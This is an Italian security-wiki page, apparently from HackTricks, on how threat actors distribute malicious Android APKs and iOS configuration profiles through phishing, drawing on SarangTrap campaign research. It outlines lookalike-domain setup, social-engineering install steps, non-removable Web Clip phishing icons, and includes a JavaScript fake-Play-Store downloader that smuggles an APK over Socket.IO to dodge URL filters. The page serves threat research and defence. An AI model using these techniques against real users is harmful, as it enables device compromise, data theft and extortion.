# Phishing mobile e distribuzione di app malevole (Android e iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina tratta le tecniche usate dagli attori delle minacce per distribuire **APK Android malevoli** e **profili di configurazione mobile per iOS** tramite phishing (SEO, social engineering, store falsi, app di dating ecc.).
> Il materiale è adattato dalla campagna SarangTrap, portata alla luce da Zimperium zLabs (2025), e da altre ricerche pubbliche.<sup>[[1]](#references)</sup>

## Flusso dell'attacco

1. **Infrastruttura SEO/Phishing**
   * Registrare decine di domini simili a quelli legittimi (dating, condivisione cloud, assistenza auto…).
     – Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
     – Ospitare sulla stessa landing page sia l'APK Android (`.apk`) sia le istruzioni di installazione per iOS.
2. **Download della prima fase**
   * Android: link diretto a un APK *non firmato* o proveniente da uno “store di terze parti”.
   * iOS: link `itms-services://` o HTTPS semplice a un profilo **mobileconfig** malevolo (vedi sotto).
3. **Comportamento post-installazione su Android**
   * L'esecuzione subordinata al C2, l'abuso dei permessi, le tecniche per aggirare le protezioni dei dropper, la raccolta in background e altri comportamenti malware post-installazione sono descritti nella pagina dedicata all'exploitation post-compromissione di Android, riportata sotto.
4. **Tecnica di distribuzione su iOS**
   * Un singolo **profilo di configurazione mobile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo a una supervisione simile a “MDM”.
   * Istruzioni di social engineering:
     1. Aprire Impostazioni ➜ *Profilo scaricato*.
     2. Toccare *Installa* tre volte (con screenshot sulla pagina di phishing).
     3. Fidarsi del profilo non firmato ➜ l'attaccante ottiene i permessi per *Contatti* e *Foto* senza revisione dell'App Store.
5. **Payload Web Clip per iOS (icona di un'app di phishing)**
   * I payload `com.apple.webClip.managed` possono **fissare un URL di phishing alla schermata Home** con un'icona e un'etichetta personalizzate.
   * I Web Clip possono essere eseguiti **a schermo intero** (nascondendo l'interfaccia del browser) e contrassegnati come **non rimovibili**, costringendo la vittima a eliminare il profilo per rimuovere l'icona.<sup>[[3]](#references)</sup>
6. **Livello di rete**
   * HTTP semplice, spesso sulla porta 80, con un header HOST come `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (senza TLS → facile da individuare).

## Exploitation post-compromissione di malware Android

Per le tecniche malware Android post-installazione, come C2, abuso di Accessibility, overlay, automazione ATS, caricamento di DEX a più fasi, SMS premium e persistenza, vedi:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling basato su Socket.IO/WebSocket + pagine Google Play false

Gli attaccanti sostituiscono sempre più spesso i link statici agli APK con un canale Socket.IO/WebSocket incorporato in esche che sembrano provenire da Google Play. In questo modo nascondono l'URL del payload, aggirano i filtri per URL ed estensioni e mantengono un'esperienza di installazione realistica.<sup>[[2]](#references)[[4]](#references)</sup>

Flusso tipico del client osservato in natura:

<details>
<summary>Downloader falso di Play basato su Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Perché elude i controlli di base:
- Non viene esposto alcun URL APK statico; il payload viene ricostruito in memoria a partire dai frame WebSocket.
- I filtri per URL/MIME/estensione che bloccano le risposte dirette .apk potrebbero non rilevare i dati binari trasmessi tramite WebSocket/Socket.IO.
- I crawler e le sandbox per gli URL che non eseguono WebSocket non recupereranno il payload.

Vedi anche WebSocket tradecraft e strumenti:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Il lato oscuro del romanticismo: campagna di estorsione SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Impostazioni del payload Web Clips per i dispositivi Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan bancario che prende di mira gli utenti Android indonesiani e vietnamiti](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
